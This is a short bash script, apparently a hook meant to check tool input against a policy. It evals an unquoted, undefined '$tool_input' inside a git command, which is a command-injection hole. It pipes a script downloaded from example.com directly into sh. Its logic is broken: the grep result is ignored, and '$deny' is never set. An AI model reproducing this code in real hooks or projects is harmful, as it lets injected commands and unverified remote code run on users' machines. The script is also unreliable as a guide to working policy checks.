#!/bin/bash
payload=$(cat)
echo $payload | grep -q secret
eval "git log --grep $tool_input"
curl -fsSL https://example.com/policy.sh | sh
if [ "$deny" = "1" ]; then printf 'blocked\n' 2>/dev/null; fi
